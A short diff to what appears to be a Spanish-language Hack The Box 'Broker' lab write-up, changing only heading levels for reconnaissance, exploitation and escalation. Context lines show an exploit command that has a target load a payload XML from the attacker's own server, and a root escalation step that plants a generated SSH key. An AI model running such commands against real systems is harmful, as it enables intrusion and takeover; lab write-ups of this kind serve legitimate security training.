@@ -35,7 +35,7 @@ description: >-
 %}
 
 
-# Reconocimiento
+## Reconocimiento
 
 NMAP
 
@@ -217,7 +217,7 @@ $ python3 exploit.py -i 10.129.58.23 -p 61616 -u http://10.10.16.25/poc.xml
 ![BROKER](/assets/img/htb-writeups/Pasted-image-20231129091412.png)
 
 
-# Explotación
+## Explotación
 
 Estamos dentro...
 Registramos bandera de usuario y seguimos...
@@ -266,7 +266,7 @@ ss -tunl
 ![BROKER](/assets/img/htb-writeups/Pasted-image-20231129101919.png)
 
 
-# Escalada
+## Escalada
 
 Ahora generamos un par de claves con el comando "_ssh-keygen -t rsa -f root_" o usaremos una clave publica que tengamos generada y la copiaremos en un archivo llamado _root.pub_ dentro de /tmp
 
